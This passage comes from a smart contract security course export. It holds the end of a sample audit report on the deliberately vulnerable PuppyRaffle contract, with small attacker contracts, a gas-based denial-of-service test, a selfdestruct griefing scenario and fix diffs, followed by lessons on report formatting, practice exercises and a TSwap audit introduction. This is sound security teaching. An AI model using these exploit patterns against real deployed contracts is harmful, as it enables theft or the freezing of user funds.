                  puppyRaffle.selectWinner();
              }
              ```

              For example, the `AttackerContract` can be this:

              ```javascript
              contract AttackerContract {
                  // Implements a `receive` function that always reverts
                  receive() external payable {
                      revert();
                  }
              }
              ```

              Or this:

              ```javascript
              contract AttackerContract {
                  // Implements a `receive` function to receive prize, but does not implement `onERC721Received` hook to receive the NFT.
                  receive() external payable {}
              }
              ```
              </details>

              **Recommended Mitigation:** Favor pull-payments over push-payments. This means modifying the `selectWinner` function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of `selectWinner`.

              ## Medium

              ### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential DoS vector, incrementing gas costs for future entrants

              **Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means that the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

              **Note to students: This next line would likely be it's own finding itself. However, we haven't taught you about MEV yet, so we are going to ignore it.**
              Additionally, this increased gas cost creates front-running opportunities where malicious users can front-run another raffle entrant's transaction, increasing its costs, so their enter transaction fails.

              **Impact:** The impact is two-fold.

              1. The gas costs for raffle entrants will greatly increase as more players enter the raffle.
              2. Front-running opportunities are created for malicious users to increase the gas costs of other users, so their transaction fails.

              **Proof of Concept:**

              If we have 2 sets of 100 players enter, the gas costs will be as such:
              - 1st 100 players: 6252039
              - 2nd 100 players: 18067741

              This is more than 3x as expensive for the second set of 100 players!

              This is due to the for loop in the `PuppyRaffle::enterRaffle` function.

              ```javascript
                      // Check for duplicates
              @>      for (uint256 i = 0; i < players.length - 1; i++) {
                          for (uint256 j = i + 1; j < players.length; j++) {
                              require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                          }
                      }
              ```

              <details>
              <summary>Proof Of Code</summary>
              Place the following test into `PuppyRaffleTest.t.sol`.

              ```javascript
              function testReadDuplicateGasCosts() public {
                      vm.txGasPrice(1);

                      // We will enter 5 players into the raffle
                      uint256 playersNum = 100;
                      address[] memory players = new address[](playersNum);
                      for (uint256 i = 0; i < playersNum; i++) {
                          players[i] = address(i);
                      }
                      // And see how much gas it cost to enter
                      uint256 gasStart = gasleft();
                      puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
                      uint256 gasEnd = gasleft();
                      uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
                      console.log("Gas cost of the 1st 100 players:", gasUsedFirst);

                      // We will enter 5 more players into the raffle
                      for (uint256 i = 0; i < playersNum; i++) {
                          players[i] = address(i + playersNum);
                      }
                      // And see how much more expensive it is
                      gasStart = gasleft();
                      puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
                      gasEnd = gasleft();
                      uint256 gasUsedSecond = (gasStart - gasEnd) * tx.gasprice;
                      console.log("Gas cost of the 2nd 100 players:", gasUsedSecond);

                      assert(gasUsedFirst < gasUsedSecond);
                      // Logs:
                      //     Gas cost of the 1st 100 players: 6252039
                      //     Gas cost of the 2nd 100 players: 18067741
              }
              ```
              </details>

              **Recommended Mitigation:** There are a few recommended mitigations.

              1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
              2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id.

              ```diff
              +    mapping(address => uint256) public addressToRaffleId;
              +    uint256 public raffleId = 0;
                  .
                  .
                  .
                  function enterRaffle(address[] memory newPlayers) public payable {
                      require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
                      for (uint256 i = 0; i < newPlayers.length; i++) {
                          players.push(newPlayers[i]);
              +            addressToRaffleId[newPlayers[i]] = raffleId;
                      }

              -        // Check for duplicates
              +       // Check for duplicates only from the new players
              +       for (uint256 i = 0; i < newPlayers.length; i++) {
              +          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
              +       }
              -        for (uint256 i = 0; i < players.length; i++) {
              -            for (uint256 j = i + 1; j < players.length; j++) {
              -                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
              -            }
              -        }
                      emit RaffleEnter(newPlayers);
                  }
              .
              .
              .
                  function selectWinner() external {
              +       raffleId = raffleId + 1;
                      require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
              ```

              Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

              ### [M-2] Balance check on `PuppyRaffle::withdrawFees` enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals

              **Description:** The `PuppyRaffle::withdrawFees` function checks the `totalFees` equals the ETH balance of the contract (`address(this).balance`). Since this contract doesn't have a `payable` fallback or `receive` function, you'd think this wouldn't be possible, but a user could `selfdesctruct` a contract with ETH in it and force funds to the `PuppyRaffle` contract, breaking this check.

              ```javascript
                  function withdrawFees() external {
              @>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
                      uint256 feesToWithdraw = totalFees;
                      totalFees = 0;
                      (bool success,) = feeAddress.call{value: feesToWithdraw}("");
                      require(success, "PuppyRaffle: Failed to withdraw fees");
                  }
              ```

              **Impact:** This would prevent the `feeAddress` from withdrawing fees. A malicious user could see a `withdrawFee` transaction in the mempool, front-run it, and block the withdrawal by sending fees.

              **Proof of Concept:**

              1. `PuppyRaffle` has 800 wei in it's balance, and 800 totalFees.
              2. Malicious user sends 1 wei via a `selfdestruct`
              3. `feeAddress` is no longer able to withdraw funds

              **Recommended Mitigation:** Remove the balance check on the `PuppyRaffle::withdrawFees` function.

              ```diff
                  function withdrawFees() external {
              -       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
                      uint256 feesToWithdraw = totalFees;
                      totalFees = 0;
                      (bool success,) = feeAddress.call{value: feesToWithdraw}("");
                      require(success, "PuppyRaffle: Failed to withdraw fees");
                  }
              ```

              ### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

              **Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.

              ```javascript
                  function selectWinner() external {
                      require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
                      require(players.length > 0, "PuppyRaffle: No players in raffle");

                      uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
                      address winner = players[winnerIndex];
                      uint256 fee = totalFees / 10;
                      uint256 winnings = address(this).balance - fee;
              @>      totalFees = totalFees + uint64(fee);
                      players = new address[](0);
                      emit RaffleWinner(winner, winnings);
                  }
              ```

              The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.

              **Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

              **Proof of Concept:**

              1. A raffle proceeds with a little more than 18 ETH worth of fees collected
              2. The line that casts the `fee` as a `uint64` hits
              3. `totalFees` is incorrectly updated with a lower amount

              You can replicate this in foundry's chisel by running the following:

              ```javascript
              uint256 max = type(uint64).max
              uint256 fee = max + 1
              uint64(fee)
              // prints 0
              ```

              **Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

              ```javascript
              // We do some storage packing to save gas
              ```
              But the potential gas saved isn't worth it if we have to recast and this bug exists.

              ```diff
              -   uint64 public totalFees = 0;
              +   uint256 public totalFees = 0;
              .
              .
              .
                  function selectWinner() external {
                      require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
                      require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
                      uint256 winnerIndex =
                          uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
                      address winner = players[winnerIndex];
                      uint256 totalAmountCollected = players.length * entranceFee;
                      uint256 prizePool = (totalAmountCollected * 80) / 100;
                      uint256 fee = (totalAmountCollected * 20) / 100;
              -       totalFees = totalFees + uint64(fee);
              +       totalFees = totalFees + fee;
              ```

              ### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

              **Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

              Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

              **Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.

              Also, true winners would not be able to get paid out, and someone else would win their money!

              **Proof of Concept:**
              1. 10 smart contract wallets enter the lottery without a fallback or receive function.
              2. The lottery ends
              3. The `selectWinner` function wouldn't work, even though the lottery is over!

              **Recommended Mitigation:** There are a few options to mitigate this issue.

              4. Do not allow smart contract wallet entrants (not recommended)
              5. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)

              ## Informational / Non-Critical

              ### [I-1] Floating pragmas

              **Description:** Contracts should use strict versions of solidity. Locking the version ensures that contracts are not deployed with a different version of solidity than they were tested with. An incorrect version could lead to uninteded results.

              https://swcregistry.io/docs/SWC-103/

              **Recommended Mitigation:** Lock up pragma versions.

              ```diff
              - pragma solidity ^0.7.6;
              + pragma solidity 0.7.6;
              ```

              ### [I-2] Magic Numbers

              **Description:** All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called "magic numbers".

              **Recommended Mitigation:** Replace all magic numbers with constants.

              ```diff
              +       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
              +       uint256 public constant FEE_PERCENTAGE = 20;
              +       uint256 public constant TOTAL_PERCENTAGE = 100;
              .
              .
              .
              -        uint256 prizePool = (totalAmountCollected * 80) / 100;
              -        uint256 fee = (totalAmountCollected * 20) / 100;
                      uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
                      uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
              ```

              ### [I-3] Test Coverage

              **Description:** The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.

              ```
              | File                               | % Lines        | % Statements   | % Branches     | % Funcs       |
              | ---------------------------------- | -------------- | -------------- | -------------- | ------------- |
              | script/DeployPuppyRaffle.sol       | 0.00% (0/3)    | 0.00% (0/4)    | 100.00% (0/0)  | 0.00% (0/1)   |
              | src/PuppyRaffle.sol                | 82.46% (47/57) | 83.75% (67/80) | 66.67% (20/30) | 77.78% (7/9)  |
              | test/auditTests/ProofOfCodes.t.sol | 100.00% (7/7)  | 100.00% (8/8)  | 50.00% (1/2)   | 100.00% (2/2) |
              | Total                              | 80.60% (54/67) | 81.52% (75/92) | 65.62% (21/32) | 75.00% (9/12) |
              ```

              **Recommended Mitigation:** Increase test coverage to 90% or higher, especially for the `Branches` column.

              ### [I-4] Zero address validation

              **Description:** The `PuppyRaffle` contract does not validate that the `feeAddress` is not the zero address. This means that the `feeAddress` could be set to the zero address, and fees would be lost.

              ```
              PuppyRaffle.constructor(uint256,address,uint256)._feeAddress (src/PuppyRaffle.sol#57) lacks a zero-check on :
                              - feeAddress = _feeAddress (src/PuppyRaffle.sol#59)
              PuppyRaffle.changeFeeAddress(address).newFeeAddress (src/PuppyRaffle.sol#165) lacks a zero-check on :
                              - feeAddress = newFeeAddress (src/PuppyRaffle.sol#166)
              ```

              **Recommended Mitigation:** Add a zero address check whenever the `feeAddress` is updated.

              ### [I-5] _isActivePlayer is never used and should be removed

              **Description:** The function `PuppyRaffle::_isActivePlayer` is never used and should be removed.

              ```diff
              -    function _isActivePlayer() internal view returns (bool) {
              -        for (uint256 i = 0; i < players.length; i++) {
              -            if (players[i] == msg.sender) {
              -                return true;
              -            }
              -        }
              -        return false;
              -    }
              ```

              ### [I-6] Unchanged variables should be constant or immutable

              Constant Instances:
              ```
              PuppyRaffle.commonImageUri (src/PuppyRaffle.sol#35) should be constant
              PuppyRaffle.legendaryImageUri (src/PuppyRaffle.sol#45) should be constant
              PuppyRaffle.rareImageUri (src/PuppyRaffle.sol#40) should be constant
              ```

              Immutable Instances:

              ```
              PuppyRaffle.raffleDuration (src/PuppyRaffle.sol#21) should be immutable
              ```

              ### [I-7] Potentially erroneous active player index

              **Description:** The `getActivePlayerIndex` function is intended to return zero when the given address is not active. However, it could also return zero for an active address stored in the first slot of the `players` array. This may cause confusions for users querying the function to obtain the index of an active player.

              **Recommended Mitigation:** Return 2**256-1 (or any other sufficiently high number) to signal that the given player is inactive, so as to avoid collision with indices of active players.

              ### [I-8] Zero address may be erroneously considered an active player

              **Description:** The `refund` function removes active players from the `players` array by setting the corresponding slots to zero. This is confirmed by its documentation, stating that "This function will allow there to be blank spots in the array". However, this is not taken into account by the `getActivePlayerIndex` function. If someone calls `getActivePlayerIndex` passing the zero address after there's been a refund, the function will consider the zero address an active player, and return its index in the `players` array.

              **Recommended Mitigation:** Skip zero addresses when iterating the `players` array in the `getActivePlayerIndex`. Do note that this change would mean that the zero address can _never_ be an active player. Therefore, it would be best if you also prevented the zero address from being registered as a valid player in the `enterRaffle` function.

              ## Gas

              ### [G-2] Storage Variables in a Loop Should be Cached

              Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.

              ```diff
              + uint256 playersLength = players.length;
              - for (uint256 i = 0; i < players.length - 1; i++) {
              + for (uint256 i = 0; i < playersLength - 1; i++) {
              -    for (uint256 j = i + 1; j < players.length; j++) {
              +    for (uint256 j = i + 1; j < playersLength; j++) {
                  require(players[i] != players[j], "PuppyRaffle: Duplicate player");
              }
              }
              ```
              ### [G-1] Unchanged state variables should be declared constant or immutable

              Reading from storage is much more expensive than reading a constant or immutable variable.

              Instances:

              - `PuppyRaffle::raffleDuration` should be `immutable`
              - `PuppyRaffle::commonImageUri` should be `constant`
              - `PuppyRaffle::rareImageUri` should be `constant`
              - `PuppyRaffle::legendaryImageUri` should be `constant`

          </details>

          ---

          The final step, once the template has been filled out is to run our CLI command

          ```bash
          pandoc report-formatted.md -o report.pdf --from markdown --template=eisvogel --listings
          ```

          ### Wrap Up

          And with that - you should have a PHENOMENAL audit report to add to your security portfolio! The very next thing you need to do is add this PDF to the GitHub repository you made in the previous section. Tracking your progress and cataloging your experience is how you'll get your name out there and show the world what you know. Even audit firms like Cyfrin do this!

          Huge congratulations, let's bring this section home!

          ---

          Similarly to the previous PDF generating lesson, I'll include some common pitfalls and solutions you can reference here, should you run into issues in this process.

          <details>
          <summary>Errors/Issues</summary>

          1. **My home/root directory doesn't have a `.pandoc` file!**

             - Depending on your operating system, this file may exist elsewhere. If you're using WSL/Linux keep a few things in mind

               - The file may be hidden - files prepended with `.` are often hidden. You can reveal all files in a directory with the command `ls -a`
               - The file may be elsewhere - navigate back in directories (`cd ..`) until you reach one that looks like this

               <img src="/security-section-3/28-making-a-pdf/making-a-pdf1.png" style="width: 75%; height: auto;">

               ...from here navigate to `usr/share/pandoc/data/templates`. In here you will find existing templates and this is where `eisvogel.latex` should be added.

          2. **VS Code says I'm _unable to write a file to that directory_!**

             - This is related to your user permissions, we can force the file to be created with a sudo command. `sudo touch eisvogel.latex` - this command will create a file named `eisvogel.latex` in your current directory.
               - You may be prompted to enter your credentials or need to create an admin user.

          3. **VS Code says I'm _unable to write to eisvogel.latex_!**

             - Similarly to above, this is permissions related. The easiest work around I found was through another `sudo` command.
               ```bash
               sudo tee eisvogel.latex << 'EOF'
               [copy LaTex here]
               EOF
               ```
             - The LaTex you need to copy is available [**here**](https://github.com/Cyfrin/audit-report-templating/blob/main/eisvogel.latex). Yes, you will be pasting 1068 lines into your terminal - this will overwrite your `eisvogel.latex` file, in your current directory, with that copied data.

          4. **When I run `pandoc report.md -o ... etc` I get _File Not Found_**

             - This seems caused when our LaTex package is missing an important element. The easiest solution is to assure we have the full distribution of the package we're using. For WSL users `sudo apt install texlive-full` will resolve these errors.
               - Note: `texlive-full` is 5.6GB in size.

          5. **When I run `pandoc report.md -o ... etc` I get _Missing number, treated as zero_**

             - Caused by an error in the LaTex syntax either in your markdown using it, or the template itself. Replace the block of LaTeX at the top of your `report.md` file with the following:

             ```
              \begin{titlepage}
              \centering
              {\Huge\bfseries Protocol Audit Report\par}
              \vspace{2cm}
              \begin{figure}[h]
              \centering
              \includegraphics[width=0.5\textwidth]{logo.pdf}
              \end{figure}
              \vspace{2cm}
              {\Large Version 1.0\par}
              \vspace{1cm}
              {\Large\itshape equious.eth\par}
              \vfill
              {\large \today\par}
              \end{titlepage}
             ```

             This should resolve the error.
        description: 'Learn how to create an audit report using Markdown and Pandoc, including adding logos, formatting sections, and converting the report to a PDF.'
      -
        id: a94fec74-bad9-491f-bf90-8e96ceeb6f83
        type: new_lesson
        enabled: true
        title: Exercises
        slug: exercises
        duration: 5
        video_url: 3IfZwGlsO9K02LUDgAaSb8jsnUltDsV7MifMH8qCe7V8
        raw_markdown_url: /routes/security/4-puppy-raffle/64-exercises/+page.md
        markdown_content: |-
          ---
          title: Exercises
          ---

          _Follow along with this video:_

          ---

          ### Exercises

          This has easily been my favourite auditing codebase. We've come a long way and now is a great time to take a break and feed that ice cream addiction.

          When you're ready we've got much more for you to dive into to sharpen your skills and further familiarize yourself with the vulnerabilities we've discussed in this section.

          Navigate to [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo.

          In the same area of this repo where we'd reference our simplified Remix examples, we've additional sections available to you, including `Ethernaut`, `Damn Vulnerable DeFi` and `Case Studies`. These are invaluable resources to challenge yourself and learn more about the security eco-system in Web3.

          ### Ethernaut

          Ethernaut, is amazing. It's effectively a compilation of CTFs (capture the flags) or games where you learn about how to exploit various vulnerabilities in a semi-live environment. There are dozens of challenges to complete. I highly recommend starting with `Hello Ethernaut` as it will outline the basics of how Ethernaut works and how to play.

          You _are_ expected to know a little bit of JavaScript for some of the functionality of `Ethernaut`, but with a little work you can deploy the instanced contracts and interact with them through `Foundry` or `Etherscan` as well.

          <img src="/security-section-4/64-exercises/exercises1.png" width="75%" height="auto">

          ### Damn Vulnerable DeFi

          I also would encourage you to check out [**Damn Vulnerable Defi**](https://www.damnvulnerabledefi.xyz/), which has a number of similar challenges. I'll warn you that DVD _is_ a bit more challenging than `Ethernaut`

          Unfortunately DVD is _also_ written in `Hardhat`, so some JavaScript knowledge goes a long way.

          > **Note:** Someone needs to rewrite this in Foundry!!!

          What you can do, if you're not comfortable with `Hardhat` would be to copy the contracts that Damn Vulnerable Defi provides you into a Forge project and just try to break it locally. Each challenge in DVD provides you with your objectives.

          <img src="/security-section-4/64-exercises/exercises2.png" width="75%" height="auto">

          ### Case Studies

          This section, of course, offers some case study examples of the vulnerabilities we've been discussing so you can gain further insight into how impactful these issues have been and how they've affected the ecosystem beyond all the theory - in the real world.

          ---

          Beyond the above, we've got **even more** for you to do to practice all you've learnt in this section.

          1. [**Ethernaut Challenges**](https://ethernaut.openzeppelin.com/) (1, 9 & 10)
          2. Sign up for [**Solodit**](https://solodit.xyz/)
          3. Post a tweet about how you completed the Puppy Raffle Audit!
          4. Sign up for [**Farcaster**](https://www.farcaster.xyz/)
          5. Do a [**CodeHawks First Flight**](https://www.codehawks.com/first-flights)

          üßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄüßë‚ÄçüöÄ

          ### Section 4 NFT Challenges

          - [**A combination hack (Arb)**](https://arbiscan.io/address/0xef72ba6575b86beaa9b9e4a78bca4a58f3cce276)
          - [**A combination hack (Sepolia)**](https://sepolia.etherscan.io/address/0xf988ebf9d801f4d3595592490d7ff029e438deca)
        description: 'Protecting Web3 Against Hacks & Attacks; Remix Exploits & DeFi Challenges. Presented by Patrick. Includes Exercises & Case Studies.'
      -
        id: 245558bd-9ab1-4fb1-a429-07d8623e5d3c
        type: new_lesson
        enabled: true
        title: Solodit
        slug: solodit
        duration: 4
        video_url: DzlS01Ier56kx009IsB2DaS00m1LPW4HypELxUegm878gI
        raw_markdown_url: /routes/security/4-puppy-raffle/65-solodit/+page.md
        markdown_content: |-
          ---
          title: Solodit
          ---

          _Follow along with this video:_

          ---

          ### Level Up Your Security Game with Solodit

          Anybody who aims to excel in competitive audits and enhance their grasp of Web3 security should pay attention. The secret tool you need to get an edge? It's called [**Solodit**](https://solodit.xyz/).

          The legendary [**Hans Friese**](https://twitter.com/hansfriese?lang=en) Was the #1 competitive auditor by earnings for the first half of 2023 with over $100,000 won.

          When asked for advice on how he performs so well, he says one of the most beneficial things he does is reading the reports of other auditors.

          Thus [**Solodit**](https://solodit.xyz/) was born. [**Solodit**](https://solodit.xyz/) aggregates publicly available security reports from across the industry into a single convenient aveneue to search and sort through.

          Once logged in you should see something like this, a clean UI through which you can search and filter by anything you'd like.

          <img src="/security-section-4/65-solodit/solodit1.png" width="75%" height="auto">

          By navigating to the [**`Audits` menu**](https://solodit.xyz/audit), we can even see live and upcoming audit competitions as well as learn about types of audits such as the Multi-Phase Audit.

          <img src="/security-section-4/65-solodit/solodit2.png" width="75%" height="auto">

          In addition to this, Solodit aggregates open `bug bounties` as well as `leaderboard` positions across multiple auditing platforms.

          There's even a notes section, to allow you to jot down your thoughts on your findings, or the findings of other people.

          [**Solodit**](https://solodit.xyz/) truly is the `one-stop-shop` for security researchers.

          ### Wrap Up

          Becoming a successful security researcher or a leading smart contract developer requires continuous learning. Solodit provides a unique platform that allows you to effortlessly learn, compete, and evolve as a professional in the sector. Consider it as your personal go-to learning and resource tool for staying abreast of industry developments. If you aspire to lead in the world of smart contract security, signing up for Solodit is a no-brainer.
        description: "Solodit - a Web3 audit finding aggregator. Learn from other auditors' reports & excel in competitive contests."
      -
        id: a5810a91-3839-4aa1-8bc3-f235e17d4ff8
        type: new_lesson
        enabled: true
        title: 'Wrapping Up'
        slug: wrapping-up
        duration: 2
        video_url: MiGd85HXLxSy005IARKrGHD01AXme01v7mfDwFreMctCYQ
        raw_markdown_url: /routes/security/4-puppy-raffle/66-wrapping-up/+page.md
        markdown_content: |-
          ---
          title: Wrapping Up
          ---

          _Follow along with this video:_

          ---

          ### Celebrate Your Wins

          The very next thing you should do is post a tweet celebrating how far you've come and flexing how much you've learnt to the community.

          ![](https://cdn.videotap.com/IWZnrLvTfiL85XHWN2bU-13.04.png)

          Go ahead and share your success on Twitter. There's no better way to share the news than a straightforward, cheerful tweet. If you're not sure how to compose your tweet, don't worry. I got you covered.

          [**Clicking this will auto-generate a tweet for you to share your success!**](https://twitter.com/intent/tweet?text=I%20just%20completed%20the%20%40cyfrinaudits%20Puppy%20Raffle%20%F0%9F%90%B6%20Audit%20from%20the%20Ultimate%20Security%20Course.%0a%0aThanks%20%40patrickalphac!)

          > "Celebrating your wins publicly not only helps you keep track of your progress but also encourages others to keep going."

          ### Farcaster: Web3 Social Media

          You might also be interested in a more Web3 focused social media, if so I'd recommend checking out [Farcaster](https://www.farcaster.xyz/) to find like-minded researches and connect!

          ### CodeHawks First Flights

          With two practice audits under your belt, I highly recommend participating in a [**CodeHawks First Flight**](https://www.codehawks.com/first-flights). These events are made specifically for someone like you, someone who wants to get their feet wet with easier/quicker competitive audits and gain some real experience.

          .. If you're feeling really confident, you may even want to try a _real_ competitive audit!

          Now's a great time to pause the course and participate in whichever First Flight is active, a new one starts every 2 weeks!

          ### Commend Yourself for The Milestone Achieved

          Regardless of what you choose to do next, take a moment to pat yourself on the back. You've made it this far and it's no small feat. You've gotten a feel for what it's like to be a security researcher‚Äîdiving into code bases, writing reports, looking for vulnerabilities, and spotting potential bugs based on past experiences.

          Remember, in this field, repetition is the mother of skill. The more audits you carry out, the more skilled you will become.

          ```js
          console.log(
            "Congratulations on getting this far! Now, go enjoy some ice cream."
          );
          ```

          Take that break, because in Section 5 the training wheels come off with `TSwap`, we're going to jump into Invariants, Fuzzing, Advanced DeFi and more.

          Congratulations again, and I'll see you in Section 5!

          üê∏
        description: 'Raffle complete, tweeting your success, CodeHawks First Flights, rest & rewards encouraged.'
    type: new_section
    enabled: true
  -
    id: 2bDIhUp4
    title: TSwap
    slug: tswap
    lessons:
      -
        id: e420cca9-92f8-48e4-ae32-33c55034fed8
        type: new_lesson
        enabled: true
        title: Introduction
        slug: introduction
        duration: 5
        video_url: Ummg02Io4mqR02gbE02Ajd00mbtRSWF02QgiDuuVqEd500gF00
        raw_markdown_url: /routes/security/5-tswap/1-introduction/+page.md
        markdown_content: |-
          ---
          title: Introduction
          ---

          _Follow along with this video:_



          ---

          # Unveiling Invariance and DeFi in Security Auditing: An Interactive Exploration

          Happy to have you back in the exciting world of Security and Auditing. So, you‚Äôve made it through the delightful puppy raffle, you have ideally signed up for Codeox and might have sprung into your first few flights or even explored a contest. That's awesome! You'd certainly be exuding more confidence about your security and auditing journey. But there's a lot more to unfold and absorb.

          ## Entering Section Five: Invariance and Introduction to DFI T-SWAP Audit

          In our detailed Git repo related to this course, when you scroll down, Section Five, Invariance and Introduction to DFI TSWAP Audit, will catch your attention. Making your journey a slight bit more interesting this time, we are moving onto another walkthrough security review. This time around, we will approach the task differently.

          ![](https://cdn.videotap.com/y4z5tLc5N9gtADQGQSGP-43.5.png)

          ## A Glimpse of What‚Äôs to Come

          Do not rush into the contracts yet, there‚Äôs plenty to learn before that! We will cover a lot in this section, a prime focus will be on 'Invariance'. Though we've touched upon invariants in the Foundry Course, we never really delved into their significance, and when it comes to security, that's when you realize how crucial they are.

          As a budding security researcher, it‚Äôs critical to understand and appreciate the weight that invariance carries. You'll learn to identify bugs without even looking at the code in-depth. Of course, this shouldn't be your only strategy in a security review, but through this session, we're demonstrating how critical and potent it can be.

          We will be wielding an array of powerful tools, such as stateful fuzzing and fuzzing invariance. If you‚Äôre unfamiliar with freepy, don't worry, we will explore that as well.

          ![](https://cdn.videotap.com/vxJBy007OWXoaJWFjk6V-97.88.png)

          ## Dive Deeper into DeFi

          DeFi experienced a surge in popularity recently. For those unfamiliar, DeFi, or decentralized finance, refers to financial services that are available on a public decentralized blockchain network. It eliminates the need for intermediaries and allows for a more open financial system.

          Despite the intricacy, DeFi is relatively straightforward to grasp. With patience and perseverance, you will understand it. It's a concept that can seem daunting initially due to the complex terms used. In reality, most of the concepts are based on basic math.

          We will dissect the Uniswap Protocol or the T swap protocol, a Decentralized Exchange in DeFi, and demystify it for better understanding. As we dive into the security review, we will use a myriad of robust tools to hack into the system.

          > "A little progress each day adds up to big results."

          This quote embodies the essence of our entire journey here. By the end of this section, you will have practically audited an entire Uniswap V1 in the audit data folder.

          ![](https://cdn.videotap.com/v1Dx6md72HKpatpU5PgM-195.75.png)

          ## A Bag Full of Exploits and Tooling

          After diving under the hood of DeFi, we're going to learn a slew of new hacking techniques and tools. These include exploring esteemed toolkits like Echidna Foundry, examining concepts like consensus mutation testing and differential testing, and studying properties and exploits such as Weird ERC-20s callbacks, rebates, reentries, and core invariant breakings.

          The prime focus for this session will be on understanding DFI and Invariance. Roughly going to the end of this section, you will have the experience of practically auditing the first-ever Uniswap created (Uniswap V1), commodities with a few of the bugs that I stumbled into during my journey.

          ## Get Set Go!

          With everything I've shared with you, brace yourself for a thrilling juncture in Security and Auditing. Let's put on our thinking caps, get our VS code and popcorn ready, and dive right into T Swap. Together, we will crack the code and delve deeper into the world of DeFi.
        description: 'Learn to find bugs without code inspection. Topics include fuzzing, AMMs, constant product formula, Uniswap/Curve Finance concepts, and more.'
      -
        id: 8cd1ab7c-5005-41ec-93c7-86d7fb7b41a0
        type: new_lesson
        enabled: true
        title: 'Phase 1: Scoping'
        slug: phase-1-scoping
        duration: 9
        video_url: J8keCLBxWY01ckQQmpl5LPqZ3X02HRwwjly6IL3u4l4VM
        raw_markdown_url: /routes/security/5-tswap/2-phase-1-scoping/+page.md
        markdown_content: |-
          ---
          title: Phase 1 - Scoping
          ---

          _Follow along with this video:_



          ---

          ## Cloning the Repo

          First things first, let's clone the repository into our security course directory as usual. Opening the repository link in a new tab, we copy the URL and perform a standard `git clone`. Let's paste this into our command line

          ```bash
          git clone https://github.com/Cyfrin/5-t-swap-audit
          ```

          This opens the 5 TSWAP audit into its own unique folder‚Äîan essential process for good workflow and code organization. To verify that all is well and we are on the correct branch, we run `git branch`.

          As expected, we are on the main branch. This serves as our starting point for this eye-opening security review.

          ![](https://cdn.videotap.com/3aVlKcGZ2t6Didb1YvL3-95.09.png)

          ## Extensive Onboarding: Why It's Key

          As we revisit the well-known Puppy Raffle, whose initial setup used basic onboarding, we delve into the importance of extensive onboarding, particularly for a TSWAP audit.

          Through this review, you'll realize why taking the time to answer extensive onboarding questions is so crucial. The information collected in this process becomes a treasure trove for any security review‚Äîmore so if questions are as painstakingly detailed as possible. That's why you want to gather as much information as possible, get your fingers everywhere credible!

          ## Gathering the Important Data

          Our onboarding sheet collects basic information such as the website URL, which could have a wealth of information. It also enforces the absolute necessity of associated documentation‚Äîa critical pillar for achieving any successful code review.

          For our TSWAP audit, the README file plays a pivotal role as our most accessible source of documentation. We also capture the point of contact, white paper, and commit hash.

